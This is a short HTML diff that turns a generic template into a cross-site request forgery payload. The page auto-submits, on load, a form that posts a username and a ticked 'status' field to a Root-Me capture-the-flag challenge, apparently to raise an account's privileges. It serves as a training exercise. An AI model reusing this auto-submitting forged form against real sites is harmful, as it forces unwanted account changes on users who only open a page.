@@ -1,8 +1,17 @@
 <html>
  <body onload=”document.frames[0].submit()”>
-  <form action=”http://target.example.com/action.html” method=”POST”>
-   <input name=”field1” value=”foo”>
-   <input name=”field2” value=”bar”>
-  </form>
+  <form action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="post" enctype="multipart/form-data">
+		<div class="form-group">
+		<label>Username:</label>
+		<input type="text" name="username" value="tst">
+		</div>
+		<br>		
+		<div class="form-group">
+		<label>Status:</label>
+		<input type="checkbox" name="status" checked>
+		</div>
+		<br>	
+		<button type="submit">Submit</button>
+		</form>
  </body>
 </html>
